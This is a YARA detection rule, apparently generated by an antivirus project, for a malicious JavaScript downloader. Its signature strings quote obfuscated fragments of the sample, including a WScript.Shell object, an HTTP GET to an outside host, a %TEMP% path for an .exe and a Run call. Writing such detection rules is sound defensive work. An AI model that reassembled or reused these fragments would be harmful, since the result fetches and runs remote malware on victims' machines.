rule sig_20160328_a1429582d017d5f5a352151254ddcdcf {
  meta:
    description = "datamaliciousorder - file 20160328_a1429582d017d5f5a352151254ddcdcf.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "75e59b183b4a584ec08ff89fc9426edb5400aa25b846b87a99c5a04079ad0373"

  strings:
    $s1  = "function Lqnwpq() {return Ciosghog[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"qdGvRRMGT1.exe\";};" fullword ascii
    $s2  = "Hkbgbf[Tpchqi](\"GET\", \"http://www.hiveclick.com/m4usd\", false);" fullword ascii
    $s3  = "do {WScript[Gcukggx](Lmsfvwt() * 11)} while (Hkbgbf[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Ciosghog = function Issdewwpa() {return WScript[Afgzknh](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Mfwdjo(Ksrpbyds, Zazamlnem){return Ksrpbyds - Zazamlnem;};" fullword ascii
    $s6  = "function Zsltlm() {return ((Lgrzhzc == true) && (Lgrzhzc == Ifzpki)) ? 1 : Mthrfhksmu;};" fullword ascii
    $s7  = "function Qwxvjq(Odypadx){Ciosghog[\"Run\"](Odypadx, Mthrfhksmu, Mthrfhksmu);};" fullword ascii
    $s8  = "function Lmsfvwt(){return 22;};" fullword ascii
    $s9  = "function Jhwsvkwbng(){return Afgzknh;};" fullword ascii
    $s10 = "var Ifzpki = false;" fullword ascii
    $s11 = "return Mfwdjo(Ebffph, Oyittykt);" fullword ascii
    $s12 = "function Remugwdkqd(){return Yawctlszvd;};" fullword ascii
    $s13 = "Lgrzhzc = true; " fullword ascii
    $s14 = "var Vryuslp = new this[\"Date\"]();" fullword ascii
    $s15 = "function Nwonjz(Txfjrfe) {var Mebnrpvzyl = (1, 2, 3, 4, 5, Txfjrfe); return Mebnrpvzyl;};" fullword ascii
    $s16 = " while (Uunuqpkson){" fullword ascii
    $s17 = "Ifzpki = true; " fullword ascii
    $s18 = "function Cszamwjqii()" fullword ascii
    $s19 = "var Intthfwuxg = false;" fullword ascii
    $s20 = "var Lgrzhzc = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}